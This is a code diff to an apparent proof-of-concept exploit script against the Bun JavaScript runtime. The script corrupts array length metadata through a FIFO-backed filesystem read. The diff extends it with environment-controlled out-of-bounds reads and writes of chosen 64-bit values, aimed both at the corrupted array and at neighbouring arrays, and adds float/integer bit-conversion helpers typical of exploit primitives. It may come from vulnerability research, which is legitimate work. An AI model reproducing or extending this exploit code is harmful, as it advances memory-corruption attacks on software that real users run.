@@ -13,8 +13,16 @@ const readOOB = process.env.READ_OOB === "1";
 const oobCount = Number(process.env.OOB_COUNT || 16);
 const oobWriteIndex = process.env.OOB_WRITE_INDEX === undefined ? -1 : Number(process.env.OOB_WRITE_INDEX);
 const oobWriteValue = Number(process.env.OOB_WRITE_VALUE || 7.291122019556398e-304);
+const oobWriteU64 = process.env.OOB_WRITE_U64 === undefined ? null : BigInt(process.env.OOB_WRITE_U64);
+const collateralOobCount = Number(process.env.COLLATERAL_OOB_COUNT || 0);
+const collateralWriteIndex = process.env.COLLATERAL_WRITE_INDEX === undefined ? -1 : Number(process.env.COLLATERAL_WRITE_INDEX);
+const collateralWriteValue = Number(process.env.COLLATERAL_WRITE_VALUE || 9.87654321098765e+122);
+const collateralWriteU64 = process.env.COLLATERAL_WRITE_U64 === undefined ? null : BigInt(process.env.COLLATERAL_WRITE_U64);
 const path = join(tmpdir(), `bun-fs-read-array-metadata-write-${process.pid}`);
 const retained = [];
+const conv = new ArrayBuffer(8);
+const convF64 = new Float64Array(conv);
+const convU64 = new BigUint64Array(conv);
 
 const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
 if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
@@ -47,6 +55,20 @@ function makeLengthPayload() {
   return payload;
 }
 
+function u64ToF64(value) {
+  convU64[0] = value;
+  return convF64[0];
+}
+
+function f64ToU64(value) {
+  convF64[0] = value;
+  return convU64[0];
+}
+
+function hex(value) {
+  return `0x${value.toString(16).padStart(16, "0")}`;
+}
+
 function summarizeOOB(arr) {
   if (!readOOB) return undefined;
 
@@ -77,12 +99,33 @@ function scanCollateralChanges(sourceIndex) {
     if (i === sourceIndex) continue;
     const arr = retained[i];
     if (arr.length !== slots || arr[0] !== 6000.5 + i || arr[slots - 1] !== 6000.5 + i + ((slots - 1) / 1024)) {
-      changed.push({
+      const item = {
         arrayIndex: i,
         length: arr.length,
         first: arr[0],
         lastInBounds: arr[slots - 1],
-      });
+      };
+
+      if (arr.length > slots && collateralOobCount > 0) {
+        const samples = [];
+        for (let j = 0; j < collateralOobCount; j++) {
+          const value = arr[slots + j];
+          if (value !== 0 && samples.length < 32) samples.push({ relativeIndex: j, value });
+        }
+        item.oob = { count: collateralOobCount, samples };
+      }
+
+      if (arr.length > slots && collateralWriteIndex >= 0) {
+        const value = collateralWriteU64 === null ? collateralWriteValue : u64ToF64(collateralWriteU64);
+        arr[slots + collateralWriteIndex] = value;
+        item.oobWrite = {
+          relativeIndex: collateralWriteIndex,
+          value: arr[slots + collateralWriteIndex],
+          bits: typeof arr[slots + collateralWriteIndex] === "number" ? hex(f64ToU64(arr[slots + collateralWriteIndex])) : undefined,
+        };
+      }
+
+      changed.push(item);
       if (changed.length >= 16) break;
     }
   }
@@ -95,10 +138,12 @@ function findLengthChange() {
     if (arr.length !== slots) {
       let oobWrite;
       if (oobWriteIndex >= 0) {
-        arr[slots + oobWriteIndex] = oobWriteValue;
+        const value = oobWriteU64 === null ? oobWriteValue : u64ToF64(oobWriteU64);
+        arr[slots + oobWriteIndex] = value;
         oobWrite = {
           relativeIndex: oobWriteIndex,
           value: arr[slots + oobWriteIndex],
+          bits: typeof arr[slots + oobWriteIndex] === "number" ? hex(f64ToU64(arr[slots + oobWriteIndex])) : undefined,
         };
       }
       return {
